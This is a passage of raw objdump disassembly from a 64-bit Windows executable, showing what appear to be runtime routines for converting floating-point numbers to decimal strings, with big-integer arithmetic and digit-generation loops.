   140009003:	ff ff ff ff 
   140009007:	e9 00 ff ff ff       	jmp    0x140008f0c
   14000900c:	48 8d 15 83 07 38 00 	lea    0x380783(%rip),%rdx        # 0x140389796
   140009013:	44 89 d9             	mov    %r11d,%ecx
   140009016:	4d 89 e8             	mov    %r13,%r8
   140009019:	81 e1 00 80 00 00    	and    $0x8000,%ecx
   14000901f:	e8 6c dd ff ff       	call   0x140006d90
   140009024:	e9 6b f6 ff ff       	jmp    0x140008694
   140009029:	90                   	nop
   14000902a:	90                   	nop
   14000902b:	90                   	nop
   14000902c:	90                   	nop
   14000902d:	90                   	nop
   14000902e:	90                   	nop
   14000902f:	90                   	nop
   140009030:	53                   	push   %rbx
   140009031:	48 83 ec 20          	sub    $0x20,%rsp
   140009035:	31 db                	xor    %ebx,%ebx
   140009037:	83 f9 1b             	cmp    $0x1b,%ecx
   14000903a:	7e 11                	jle    0x14000904d
   14000903c:	b8 04 00 00 00       	mov    $0x4,%eax
   140009041:	01 c0                	add    %eax,%eax
   140009043:	83 c3 01             	add    $0x1,%ebx
   140009046:	8d 50 17             	lea    0x17(%rax),%edx
   140009049:	39 ca                	cmp    %ecx,%edx
   14000904b:	7c f4                	jl     0x140009041
   14000904d:	89 d9                	mov    %ebx,%ecx
   14000904f:	e8 1c 1b 00 00       	call   0x14000ab70
   140009054:	89 18                	mov    %ebx,(%rax)
   140009056:	48 83 c0 04          	add    $0x4,%rax
   14000905a:	48 83 c4 20          	add    $0x20,%rsp
   14000905e:	5b                   	pop    %rbx
   14000905f:	c3                   	ret
   140009060:	57                   	push   %rdi
   140009061:	56                   	push   %rsi
   140009062:	53                   	push   %rbx
   140009063:	48 83 ec 20          	sub    $0x20,%rsp
   140009067:	41 83 f8 1b          	cmp    $0x1b,%r8d
   14000906b:	48 89 ce             	mov    %rcx,%rsi
   14000906e:	48 89 d7             	mov    %rdx,%rdi
   140009071:	7e 6d                	jle    0x1400090e0
   140009073:	b8 04 00 00 00       	mov    $0x4,%eax
   140009078:	31 db                	xor    %ebx,%ebx
   14000907a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140009080:	01 c0                	add    %eax,%eax
   140009082:	83 c3 01             	add    $0x1,%ebx
   140009085:	8d 48 17             	lea    0x17(%rax),%ecx
   140009088:	41 39 c8             	cmp    %ecx,%r8d
   14000908b:	7f f3                	jg     0x140009080
   14000908d:	89 d9                	mov    %ebx,%ecx
   14000908f:	e8 dc 1a 00 00       	call   0x14000ab70
   140009094:	4c 8d 46 01          	lea    0x1(%rsi),%r8
   140009098:	89 18                	mov    %ebx,(%rax)
   14000909a:	44 0f b6 0e          	movzbl (%rsi),%r9d
   14000909e:	48 89 c1             	mov    %rax,%rcx
   1400090a1:	48 8d 40 04          	lea    0x4(%rax),%rax
   1400090a5:	45 84 c9             	test   %r9b,%r9b
   1400090a8:	44 88 49 04          	mov    %r9b,0x4(%rcx)
   1400090ac:	48 89 c1             	mov    %rax,%rcx
   1400090af:	74 15                	je     0x1400090c6
   1400090b1:	49 83 c0 01          	add    $0x1,%r8
   1400090b5:	45 0f b6 48 ff       	movzbl -0x1(%r8),%r9d
   1400090ba:	48 83 c1 01          	add    $0x1,%rcx
   1400090be:	45 84 c9             	test   %r9b,%r9b
   1400090c1:	44 88 09             	mov    %r9b,(%rcx)
   1400090c4:	75 eb                	jne    0x1400090b1
   1400090c6:	48 85 ff             	test   %rdi,%rdi
   1400090c9:	74 03                	je     0x1400090ce
   1400090cb:	48 89 0f             	mov    %rcx,(%rdi)
   1400090ce:	48 83 c4 20          	add    $0x20,%rsp
   1400090d2:	5b                   	pop    %rbx
   1400090d3:	5e                   	pop    %rsi
   1400090d4:	5f                   	pop    %rdi
   1400090d5:	c3                   	ret
   1400090d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400090dd:	00 00 00 
   1400090e0:	31 db                	xor    %ebx,%ebx
   1400090e2:	eb a9                	jmp    0x14000908d
   1400090e4:	66 90                	xchg   %ax,%ax
   1400090e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400090ed:	00 00 00 
   1400090f0:	ba 01 00 00 00       	mov    $0x1,%edx
   1400090f5:	48 89 c8             	mov    %rcx,%rax
   1400090f8:	8b 49 fc             	mov    -0x4(%rcx),%ecx
   1400090fb:	d3 e2                	shl    %cl,%edx
   1400090fd:	89 48 04             	mov    %ecx,0x4(%rax)
   140009100:	48 8d 48 fc          	lea    -0x4(%rax),%rcx
   140009104:	89 50 08             	mov    %edx,0x8(%rax)
   140009107:	e9 64 1b 00 00       	jmp    0x14000ac70
   14000910c:	0f 1f 40 00          	nopl   0x0(%rax)
   140009110:	41 57                	push   %r15
   140009112:	41 56                	push   %r14
   140009114:	41 55                	push   %r13
   140009116:	41 54                	push   %r12
   140009118:	55                   	push   %rbp
   140009119:	57                   	push   %rdi
   14000911a:	56                   	push   %rsi
   14000911b:	53                   	push   %rbx
   14000911c:	48 83 ec 38          	sub    $0x38,%rsp
   140009120:	31 c0                	xor    %eax,%eax
   140009122:	8b 72 14             	mov    0x14(%rdx),%esi
   140009125:	39 71 14             	cmp    %esi,0x14(%rcx)
   140009128:	49 89 cd             	mov    %rcx,%r13
   14000912b:	49 89 d6             	mov    %rdx,%r14
   14000912e:	0f 8c 45 01 00 00    	jl     0x140009279
   140009134:	48 8d 5a 18          	lea    0x18(%rdx),%rbx
   140009138:	83 ee 01             	sub    $0x1,%esi
   14000913b:	31 d2                	xor    %edx,%edx
   14000913d:	48 8d 69 18          	lea    0x18(%rcx),%rbp
   140009141:	4c 63 de             	movslq %esi,%r11
   140009144:	49 c1 e3 02          	shl    $0x2,%r11
   140009148:	4a 8d 3c 1b          	lea    (%rbx,%r11,1),%rdi
   14000914c:	49 01 eb             	add    %rbp,%r11
   14000914f:	45 8b 03             	mov    (%r11),%r8d
   140009152:	8b 07                	mov    (%rdi),%eax
   140009154:	8d 48 01             	lea    0x1(%rax),%ecx
   140009157:	44 89 c0             	mov    %r8d,%eax
   14000915a:	f7 f1                	div    %ecx
   14000915c:	41 39 c8             	cmp    %ecx,%r8d
   14000915f:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
   140009163:	41 89 c4             	mov    %eax,%r12d
   140009166:	0f 82 8c 00 00 00    	jb     0x1400091f8
   14000916c:	41 89 c7             	mov    %eax,%r15d
   14000916f:	49 89 da             	mov    %rbx,%r10
   140009172:	49 89 e9             	mov    %rbp,%r9
   140009175:	31 c0                	xor    %eax,%eax
   140009177:	31 c9                	xor    %ecx,%ecx
   140009179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140009180:	49 83 c2 04          	add    $0x4,%r10
   140009184:	41 8b 52 fc          	mov    -0x4(%r10),%edx
   140009188:	49 83 c1 04          	add    $0x4,%r9
   14000918c:	45 8b 41 fc          	mov    -0x4(%r9),%r8d
   140009190:	49 0f af d7          	imul   %r15,%rdx
   140009194:	48 01 c2             	add    %rax,%rdx
   140009197:	48 89 d0             	mov    %rdx,%rax
   14000919a:	89 d2                	mov    %edx,%edx
   14000919c:	48 01 ca             	add    %rcx,%rdx
   14000919f:	48 c1 e8 20          	shr    $0x20,%rax
   1400091a3:	49 29 d0             	sub    %rdx,%r8
   1400091a6:	4c 89 c2             	mov    %r8,%rdx
   1400091a9:	45 89 41 fc          	mov    %r8d,-0x4(%r9)
   1400091ad:	48 c1 ea 20          	shr    $0x20,%rdx
   1400091b1:	48 89 d1             	mov    %rdx,%rcx
   1400091b4:	83 e1 01             	and    $0x1,%ecx
   1400091b7:	4c 39 d7             	cmp    %r10,%rdi
   1400091ba:	73 c4                	jae    0x140009180
   1400091bc:	45 8b 3b             	mov    (%r11),%r15d
   1400091bf:	45 85 ff             	test   %r15d,%r15d
   1400091c2:	75 34                	jne    0x1400091f8
   1400091c4:	49 8d 43 fc          	lea    -0x4(%r11),%rax
   1400091c8:	48 39 c5             	cmp    %rax,%rbp
   1400091cb:	73 27                	jae    0x1400091f4
   1400091cd:	45 8b 53 fc          	mov    -0x4(%r11),%r10d
   1400091d1:	45 85 d2             	test   %r10d,%r10d
   1400091d4:	74 12                	je     0x1400091e8
   1400091d6:	eb 1c                	jmp    0x1400091f4
   1400091d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400091df:	00 
   1400091e0:	44 8b 08             	mov    (%rax),%r9d
   1400091e3:	45 85 c9             	test   %r9d,%r9d
   1400091e6:	75 0c                	jne    0x1400091f4
   1400091e8:	48 83 e8 04          	sub    $0x4,%rax
   1400091ec:	83 ee 01             	sub    $0x1,%esi
   1400091ef:	48 39 c5             	cmp    %rax,%rbp
   1400091f2:	72 ec                	jb     0x1400091e0
   1400091f4:	41 89 75 14          	mov    %esi,0x14(%r13)
   1400091f8:	4c 89 f2             	mov    %r14,%rdx
   1400091fb:	4c 89 e9             	mov    %r13,%rcx
   1400091fe:	e8 7d 1f 00 00       	call   0x14000b180
   140009203:	85 c0                	test   %eax,%eax
   140009205:	78 6f                	js     0x140009276
   140009207:	44 8b 64 24 2c       	mov    0x2c(%rsp),%r12d
   14000920c:	49 89 e8             	mov    %rbp,%r8
   14000920f:	31 c0                	xor    %eax,%eax
   140009211:	41 83 c4 01          	add    $0x1,%r12d
   140009215:	48 83 c3 04          	add    $0x4,%rbx
   140009219:	8b 4b fc             	mov    -0x4(%rbx),%ecx
   14000921c:	49 83 c0 04          	add    $0x4,%r8
   140009220:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   140009224:	48 01 c8             	add    %rcx,%rax
   140009227:	48 29 c2             	sub    %rax,%rdx
   14000922a:	48 89 d0             	mov    %rdx,%rax
   14000922d:	41 89 50 fc          	mov    %edx,-0x4(%r8)
   140009231:	48 c1 e8 20          	shr    $0x20,%rax
   140009235:	83 e0 01             	and    $0x1,%eax
   140009238:	48 39 df             	cmp    %rbx,%rdi
   14000923b:	73 d8                	jae    0x140009215
   14000923d:	48 63 c6             	movslq %esi,%rax
   140009240:	48 8d 54 85 00       	lea    0x0(%rbp,%rax,4),%rdx
   140009245:	44 8b 02             	mov    (%rdx),%r8d
   140009248:	45 85 c0             	test   %r8d,%r8d
   14000924b:	75 29                	jne    0x140009276
   14000924d:	48 8d 42 fc          	lea    -0x4(%rdx),%rax
   140009251:	48 39 c5             	cmp    %rax,%rbp
   140009254:	73 1c                	jae    0x140009272
   140009256:	8b 4a fc             	mov    -0x4(%rdx),%ecx
   140009259:	85 c9                	test   %ecx,%ecx
   14000925b:	74 09                	je     0x140009266
   14000925d:	eb 13                	jmp    0x140009272
   14000925f:	90                   	nop
   140009260:	8b 10                	mov    (%rax),%edx
   140009262:	85 d2                	test   %edx,%edx
   140009264:	75 0c                	jne    0x140009272
   140009266:	48 83 e8 04          	sub    $0x4,%rax
   14000926a:	83 ee 01             	sub    $0x1,%esi
   14000926d:	48 39 c5             	cmp    %rax,%rbp
   140009270:	72 ee                	jb     0x140009260
   140009272:	41 89 75 14          	mov    %esi,0x14(%r13)
   140009276:	44 89 e0             	mov    %r12d,%eax
   140009279:	48 83 c4 38          	add    $0x38,%rsp
   14000927d:	5b                   	pop    %rbx
   14000927e:	5e                   	pop    %rsi
   14000927f:	5f                   	pop    %rdi
   140009280:	5d                   	pop    %rbp
   140009281:	41 5c                	pop    %r12
   140009283:	41 5d                	pop    %r13
   140009285:	41 5e                	pop    %r14
   140009287:	41 5f                	pop    %r15
   140009289:	c3                   	ret
   14000928a:	90                   	nop
   14000928b:	90                   	nop
   14000928c:	90                   	nop
   14000928d:	90                   	nop
   14000928e:	90                   	nop
   14000928f:	90                   	nop
   140009290:	41 57                	push   %r15
   140009292:	41 56                	push   %r14
   140009294:	41 55                	push   %r13
   140009296:	41 54                	push   %r12
   140009298:	55                   	push   %rbp
   140009299:	57                   	push   %rdi
   14000929a:	56                   	push   %rsi
   14000929b:	53                   	push   %rbx
   14000929c:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   1400092a3:	0f 29 b4 24 80 00 00 	movaps %xmm6,0x80(%rsp)
   1400092aa:	00 
   1400092ab:	45 8b 29             	mov    (%r9),%r13d
   1400092ae:	44 89 e8             	mov    %r13d,%eax
   1400092b1:	48 89 cb             	mov    %rcx,%rbx
   1400092b4:	89 94 24 e8 00 00 00 	mov    %edx,0xe8(%rsp)
   1400092bb:	4c 89 ce             	mov    %r9,%rsi
   1400092be:	83 e0 cf             	and    $0xffffffcf,%eax
   1400092c1:	4c 89 84 24 f0 00 00 	mov    %r8,0xf0(%rsp)
   1400092c8:	00 
   1400092c9:	41 89 01             	mov    %eax,(%r9)
   1400092cc:	44 89 e8             	mov    %r13d,%eax
   1400092cf:	83 e0 07             	and    $0x7,%eax
   1400092d2:	83 f8 04             	cmp    $0x4,%eax
   1400092d5:	0f 87 49 16 00 00    	ja     0x14000a924
   1400092db:	48 8d 15 3e 06 38 00 	lea    0x38063e(%rip),%rdx        # 0x140389920
   1400092e2:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   1400092e6:	48 01 d0             	add    %rdx,%rax
   1400092e9:	ff e0                	jmp    *%rax
   1400092eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400092f0:	4c 89 f9             	mov    %r15,%rcx
   1400092f3:	e8 78 19 00 00       	call   0x14000ac70
   1400092f8:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   1400092ff:	00 
   140009300:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140009306:	48 8b 94 24 18 01 00 	mov    0x118(%rsp),%rdx
   14000930d:	00 
   14000930e:	48 8d 0d 08 06 38 00 	lea    0x380608(%rip),%rcx        # 0x14038991d
   140009315:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000931b:	e8 40 fd ff ff       	call   0x140009060
   140009320:	90                   	nop
   140009321:	0f 28 b4 24 80 00 00 	movaps 0x80(%rsp),%xmm6
   140009328:	00 
   140009329:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140009330:	5b                   	pop    %rbx
   140009331:	5e                   	pop    %rsi
   140009332:	5f                   	pop    %rdi
   140009333:	5d                   	pop    %rbp
   140009334:	41 5c                	pop    %r12
   140009336:	41 5d                	pop    %r13
   140009338:	41 5e                	pop    %r14
   14000933a:	41 5f                	pop    %r15
   14000933c:	c3                   	ret
   14000933d:	0f 1f 00             	nopl   (%rax)
   140009340:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   140009347:	00 
   140009348:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000934e:	48 8b 94 24 18 01 00 	mov    0x118(%rsp),%rdx
   140009355:	00 
   140009356:	48 8d 0d bc 05 38 00 	lea    0x3805bc(%rip),%rcx        # 0x140389919
   14000935d:	c7 00 00 80 ff ff    	movl   $0xffff8000,(%rax)
   140009363:	e8 f8 fc ff ff       	call   0x140009060
   140009368:	eb b7                	jmp    0x140009321
   14000936a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140009370:	48 8b 84 24 10 01 00 	mov    0x110(%rsp),%rax
   140009377:	00 
   140009378:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000937e:	48 8b 94 24 18 01 00 	mov    0x118(%rsp),%rdx
   140009385:	00 
   140009386:	48 8d 0d 83 05 38 00 	lea    0x380583(%rip),%rcx        # 0x140389910
   14000938d:	c7 00 00 80 ff ff    	movl   $0xffff8000,(%rax)
   140009393:	e8 c8 fc ff ff       	call   0x140009060
   140009398:	eb 87                	jmp    0x140009321
   14000939a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400093a0:	8b 39                	mov    (%rcx),%edi
   1400093a2:	31 c9                	xor    %ecx,%ecx
   1400093a4:	83 ff 20             	cmp    $0x20,%edi
   1400093a7:	7e 10                	jle    0x1400093b9
   1400093a9:	b8 20 00 00 00       	mov    $0x20,%eax
   1400093ae:	66 90                	xchg   %ax,%ax
   1400093b0:	01 c0                	add    %eax,%eax
   1400093b2:	83 c1 01             	add    $0x1,%ecx
   1400093b5:	39 c7                	cmp    %eax,%edi
   1400093b7:	7f f7                	jg     0x1400093b0
   1400093b9:	e8 b2 17 00 00       	call   0x14000ab70
   1400093be:	48 8b 8c 24 f0 00 00 	mov    0xf0(%rsp),%rcx
   1400093c5:	00 
   1400093c6:	49 89 c7             	mov    %rax,%r15
   1400093c9:	8d 47 ff             	lea    -0x1(%rdi),%eax
   1400093cc:	4d 8d 4f 18          	lea    0x18(%r15),%r9
   1400093d0:	c1 f8 05             	sar    $0x5,%eax
   1400093d3:	48 98                	cltq
   1400093d5:	48 89 ca             	mov    %rcx,%rdx
   1400093d8:	4c 8d 04 81          	lea    (%rcx,%rax,4),%r8
   1400093dc:	4c 89 c8             	mov    %r9,%rax
   1400093df:	90                   	nop
   1400093e0:	8b 0a                	mov    (%rdx),%ecx
   1400093e2:	48 83 c2 04          	add    $0x4,%rdx
   1400093e6:	48 83 c0 04          	add    $0x4,%rax
   1400093ea:	49 39 d0             	cmp    %rdx,%r8
   1400093ed:	89 48 fc             	mov    %ecx,-0x4(%rax)
   1400093f0:	73 ee                	jae    0x1400093e0
   1400093f2:	4c 29 c8             	sub    %r9,%rax
   1400093f5:	48 c1 f8 02          	sar    $0x2,%rax
   1400093f9:	89 c2                	mov    %eax,%edx
   1400093fb:	48 98                	cltq
   1400093fd:	49 8d 04 87          	lea    (%r15,%rax,4),%rax
   140009401:	eb 10                	jmp    0x140009413
   140009403:	48 83 e8 04          	sub    $0x4,%rax
   140009407:	45 85 f6             	test   %r14d,%r14d
   14000940a:	44 89 f2             	mov    %r14d,%edx
   14000940d:	0f 84 5e 01 00 00    	je     0x140009571
   140009413:	8b 48 14             	mov    0x14(%rax),%ecx
   140009416:	44 8d 72 ff          	lea    -0x1(%rdx),%r14d
   14000941a:	85 c9                	test   %ecx,%ecx
   14000941c:	74 e5                	je     0x140009403
   14000941e:	4d 63 f6             	movslq %r14d,%r14
   140009421:	41 89 57 14          	mov    %edx,0x14(%r15)
   140009425:	c1 e2 05             	shl    $0x5,%edx
   140009428:	43 0f bd 44 b7 18    	bsr    0x18(%r15,%r14,4),%eax
   14000942e:	41 89 d6             	mov    %edx,%r14d
   140009431:	83 f0 1f             	xor    $0x1f,%eax
   140009434:	41 29 c6             	sub    %eax,%r14d
   140009437:	4c 89 f9             	mov    %r15,%rcx
   14000943a:	e8 d1 15 00 00       	call   0x14000aa10
   14000943f:	44 8b a4 24 e8 00 00 	mov    0xe8(%rsp),%r12d
   140009446:	00 
   140009447:	85 c0                	test   %eax,%eax
   140009449:	89 44 24 7c          	mov    %eax,0x7c(%rsp)
   14000944d:	0f 85 2d 01 00 00    	jne    0x140009580
   140009453:	41 8b 47 14          	mov    0x14(%r15),%eax
   140009457:	85 c0                	test   %eax,%eax
   140009459:	0f 84 91 fe ff ff    	je     0x1400092f0
   14000945f:	48 8d 54 24 7c       	lea    0x7c(%rsp),%rdx
   140009464:	4c 89 f9             	mov    %r15,%rcx
   140009467:	e8 c4 1e 00 00       	call   0x14000b330
   14000946c:	43 8d 04 34          	lea    (%r12,%r14,1),%eax
   140009470:	44 8d 40 ff          	lea    -0x1(%rax),%r8d
   140009474:	66 49 0f 7e c1       	movq   %xmm0,%r9
   140009479:	66 48 0f 7e c2       	movq   %xmm0,%rdx
   14000947e:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140009482:	49 c1 e9 20          	shr    $0x20,%r9
   140009486:	89 d2                	mov    %edx,%edx
   140009488:	f2 41 0f 2a c0       	cvtsi2sd %r8d,%xmm0
   14000948d:	41 81 e1 ff ff 0f 00 	and    $0xfffff,%r9d
   140009494:	f2 0f 59 05 b4 04 38 	mulsd  0x3804b4(%rip),%xmm0        # 0x140389950
   14000949b:	00 
   14000949c:	41 81 c9 00 00 f0 3f 	or     $0x3ff00000,%r9d
   1400094a3:	4c 89 c9             	mov    %r9,%rcx
   1400094a6:	48 c1 e1 20          	shl    $0x20,%rcx
   1400094aa:	48 09 ca             	or     %rcx,%rdx
   1400094ad:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400094b2:	29 c1                	sub    %eax,%ecx
   1400094b4:	45 85 c0             	test   %r8d,%r8d
   1400094b7:	66 48 0f 6e ca       	movq   %rdx,%xmm1
   1400094bc:	41 0f 49 c8          	cmovns %r8d,%ecx
   1400094c0:	f2 0f 5c 0d 70 04 38 	subsd  0x380470(%rip),%xmm1        # 0x140389938
   1400094c7:	00 
   1400094c8:	f2 0f 59 0d 70 04 38 	mulsd  0x380470(%rip),%xmm1        # 0x140389940
   1400094cf:	00 
   1400094d0:	81 e9 35 04 00 00    	sub    $0x435,%ecx
   1400094d6:	f2 0f 58 0d 6a 04 38 	addsd  0x38046a(%rip),%xmm1        # 0x140389948
   1400094dd:	00 
   1400094de:	85 c9                	test   %ecx,%ecx
   1400094e0:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
   1400094e4:	7e 14                	jle    0x1400094fa
   1400094e6:	66 0f ef c0          	pxor   %xmm0,%xmm0
   1400094ea:	f2 0f 2a c1          	cvtsi2sd %ecx,%xmm0
   1400094ee:	f2 0f 59 05 62 04 38 	mulsd  0x380462(%rip),%xmm0        # 0x140389958
   1400094f5:	00 
   1400094f6:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
   1400094fa:	f2 0f 2c c9          	cvttsd2si %xmm1,%ecx
   1400094fe:	66 0f ef f6          	pxor   %xmm6,%xmm6
   140009502:	66 0f 2f f1          	comisd %xmm1,%xmm6
   140009506:	89 4c 24 2c          	mov    %ecx,0x2c(%rsp)
   14000950a:	0f 87 b3 06 00 00    	ja     0x140009bc3
   140009510:	44 89 c1             	mov    %r8d,%ecx
   140009513:	44 8b 54 24 2c       	mov    0x2c(%rsp),%r10d
   140009518:	89 d2                	mov    %edx,%edx
   14000951a:	c1 e1 14             	shl    $0x14,%ecx
   14000951d:	44 01 c9             	add    %r9d,%ecx
   140009520:	48 c1 e1 20          	shl    $0x20,%rcx
   140009524:	48 09 ca             	or     %rcx,%rdx
   140009527:	44 89 f1             	mov    %r14d,%ecx
   14000952a:	44 29 c1             	sub    %r8d,%ecx
   14000952d:	41 83 fa 16          	cmp    $0x16,%r10d
   140009531:	49 89 d3             	mov    %rdx,%r11
   140009534:	48 89 54 24 60       	mov    %rdx,0x60(%rsp)
   140009539:	44 8d 49 ff          	lea    -0x1(%rcx),%r9d
   14000953d:	77 62                	ja     0x1400095a1
   14000953f:	4c 8b 05 0a 07 38 00 	mov    0x38070a(%rip),%r8        # 0x140389c50
   140009546:	49 63 d2             	movslq %r10d,%rdx
   140009549:	66 49 0f 6e eb       	movq   %r11,%xmm5
   14000954e:	f2 41 0f 10 04 d0    	movsd  (%r8,%rdx,8),%xmm0
   140009554:	66 0f 2f c5          	comisd %xmm5,%xmm0
   140009558:	0f 86 f2 02 00 00    	jbe    0x140009850
   14000955e:	41 83 ea 01          	sub    $0x1,%r10d
   140009562:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%rsp)
   140009569:	00 
   14000956a:	44 89 54 24 2c       	mov    %r10d,0x2c(%rsp)
   14000956f:	eb 38                	jmp    0x1400095a9
   140009571:	41 c7 47 14 00 00 00 	movl   $0x0,0x14(%r15)
   140009578:	00 
   140009579:	e9 b9 fe ff ff       	jmp    0x140009437
   14000957e:	66 90                	xchg   %ax,%ax
   140009580:	89 c2                	mov    %eax,%edx
   140009582:	4c 89 f9             	mov    %r15,%rcx
   140009585:	e8 a6 13 00 00       	call   0x14000a930
   14000958a:	8b 44 24 7c          	mov    0x7c(%rsp),%eax
   14000958e:	44 8b a4 24 e8 00 00 	mov    0xe8(%rsp),%r12d
   140009595:	00 
   140009596:	41 29 c6             	sub    %eax,%r14d
   140009599:	41 01 c4             	add    %eax,%r12d
   14000959c:	e9 b2 fe ff ff       	jmp    0x140009453
   1400095a1:	c7 44 24 5c 01 00 00 	movl   $0x1,0x5c(%rsp)
   1400095a8:	00 
   1400095a9:	45 85 c9             	test   %r9d,%r9d
   1400095ac:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   1400095b3:	00 
   1400095b4:	0f 88 f6 05 00 00    	js     0x140009bb0
   1400095ba:	8b 6c 24 2c          	mov    0x2c(%rsp),%ebp
   1400095be:	85 ed                	test   %ebp,%ebp
   1400095c0:	0f 89 a3 02 00 00    	jns    0x140009869
   1400095c6:	8b 4c 24 2c          	mov    0x2c(%rsp),%ecx
   1400095ca:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%rsp)
   1400095d1:	00 
   1400095d2:	29 4c 24 48          	sub    %ecx,0x48(%rsp)
   1400095d6:	89 ca                	mov    %ecx,%edx
   1400095d8:	89 4c 24 54          	mov    %ecx,0x54(%rsp)
   1400095dc:	f7 da                	neg    %edx
   1400095de:	89 54 24 58          	mov    %edx,0x58(%rsp)
   1400095e2:	83 bc 24 00 01 00 00 	cmpl   $0x9,0x100(%rsp)
   1400095e9:	09 
   1400095ea:	0f 87 91 02 00 00    	ja     0x140009881
   1400095f0:	83 bc 24 00 01 00 00 	cmpl   $0x5,0x100(%rsp)
   1400095f7:	05 
   1400095f8:	0f 8f e3 05 00 00    	jg     0x140009be1
   1400095fe:	05 fd 03 00 00       	add    $0x3fd,%eax
   140009603:	31 ed                	xor    %ebp,%ebp
   140009605:	3d f7 07 00 00       	cmp    $0x7f7,%eax
   14000960a:	40 0f 96 c5          	setbe  %bpl
   14000960e:	83 bc 24 00 01 00 00 	cmpl   $0x3,0x100(%rsp)
   140009615:	03 
   140009616:	0f 84 34 0b 00 00    	je     0x14000a150
   14000961c:	0f 8e ce 06 00 00    	jle    0x140009cf0
   140009622:	83 bc 24 00 01 00 00 	cmpl   $0x4,0x100(%rsp)
   140009629:	04 
   14000962a:	0f 85 e0 06 00 00    	jne    0x140009d10
   140009630:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   140009637:	00 
   140009638:	44 8b 9c 24 08 01 00 	mov    0x108(%rsp),%r11d
   14000963f:	00 
   140009640:	b8 01 00 00 00       	mov    $0x1,%eax
   140009645:	45 85 db             	test   %r11d,%r11d
   140009648:	0f 4f 84 24 08 01 00 	cmovg  0x108(%rsp),%eax
   14000964f:	00 
   140009650:	89 84 24 08 01 00 00 	mov    %eax,0x108(%rsp)
   140009657:	89 c1                	mov    %eax,%ecx
   140009659:	89 44 24 7c          	mov    %eax,0x7c(%rsp)
   14000965d:	89 44 24 6c          	mov    %eax,0x6c(%rsp)
   140009661:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140009665:	44 89 4c 24 68       	mov    %r9d,0x68(%rsp)
   14000966a:	e8 c1 f9 ff ff       	call   0x140009030
   14000966f:	83 7c 24 30 0e       	cmpl   $0xe,0x30(%rsp)
   140009674:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140009679:	44 8b 4c 24 68       	mov    0x68(%rsp),%r9d
   14000967e:	0f 96 c0             	setbe  %al
   140009681:	21 c5                	and    %eax,%ebp
   140009683:	8b 43 0c             	mov    0xc(%rbx),%eax
   140009686:	83 e8 01             	sub    $0x1,%eax
   140009689:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000968d:	74 29                	je     0x1400096b8
   14000968f:	8b 4c 24 38          	mov    0x38(%rsp),%ecx
   140009693:	b8 02 00 00 00       	mov    $0x2,%eax
   140009698:	85 c9                	test   %ecx,%ecx
   14000969a:	0f 49 c1             	cmovns %ecx,%eax
   14000969d:	41 83 e5 08          	and    $0x8,%r13d
   1400096a1:	89 c1                	mov    %eax,%ecx
   1400096a3:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1400096a7:	0f 84 c8 05 00 00    	je     0x140009c75
   1400096ad:	b8 03 00 00 00       	mov    $0x3,%eax
   1400096b2:	29 c8                	sub    %ecx,%eax
   1400096b4:	89 44 24 38          	mov    %eax,0x38(%rsp)
   1400096b8:	40 84 ed             	test   %bpl,%bpl
   1400096bb:	0f 84 b4 05 00 00    	je     0x140009c75
   1400096c1:	44 8b 44 24 38       	mov    0x38(%rsp),%r8d
   1400096c6:	44 0b 44 24 54       	or     0x54(%rsp),%r8d
   1400096cb:	0f 85 a4 05 00 00    	jne    0x140009c75
   1400096d1:	44 8b 54 24 5c       	mov    0x5c(%rsp),%r10d
   1400096d6:	c7 44 24 7c 00 00 00 	movl   $0x0,0x7c(%rsp)
   1400096dd:	00 
   1400096de:	f2 0f 10 44 24 60    	movsd  0x60(%rsp),%xmm0
   1400096e4:	45 85 d2             	test   %r10d,%r10d
   1400096e7:	74 12                	je     0x1400096fb
   1400096e9:	f2 0f 10 0d 77 02 38 	movsd  0x380277(%rip),%xmm1        # 0x140389968
   1400096f0:	00 
   1400096f1:	66 0f 2f c8          	comisd %xmm0,%xmm1
   1400096f5:	0f 87 a0 0e 00 00    	ja     0x14000a59b
   1400096fb:	66 0f 28 c8          	movapd %xmm0,%xmm1
   1400096ff:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
   140009703:	f2 0f 58 0d 75 02 38 	addsd  0x380275(%rip),%xmm1        # 0x140389980
   14000970a:	00 
   14000970b:	66 48 0f 7e ca       	movq   %xmm1,%rdx
   140009710:	66 48 0f 7e c8       	movq   %xmm1,%rax
   140009715:	48 c1 ea 20          	shr    $0x20,%rdx
   140009719:	89 c0                	mov    %eax,%eax
   14000971b:	81 ea 00 00 40 03    	sub    $0x3400000,%edx
   140009721:	48 c1 e2 20          	shl    $0x20,%rdx
   140009725:	48 09 d0             	or     %rdx,%rax
   140009728:	8b 54 24 30          	mov    0x30(%rsp),%edx
   14000972c:	85 d2                	test   %edx,%edx
   14000972e:	0f 84 10 05 00 00    	je     0x140009c44
